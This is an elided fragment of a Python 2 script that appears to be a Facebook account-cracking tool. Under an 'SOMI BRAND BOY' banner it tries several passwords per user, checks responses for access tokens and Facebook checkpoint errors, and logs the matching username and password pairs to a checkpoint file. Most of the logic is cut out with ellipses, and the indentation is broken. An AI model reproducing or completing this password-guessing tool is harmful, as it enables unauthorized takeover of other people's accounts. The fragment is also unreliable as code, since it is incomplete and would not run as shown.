...
def login():
    ...
    time.sleep(0.05)
    print "\033[1;92mÂ«-----------------\033[1;91mSOMI BRAND BOY\033[1;95m---------------Â»"
    time.sleep(0.05)
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass1+'\n'
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 				            ...
 				            if 'access_token' in q:
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    if 'access_token' in q:
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;97m[24Hours] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
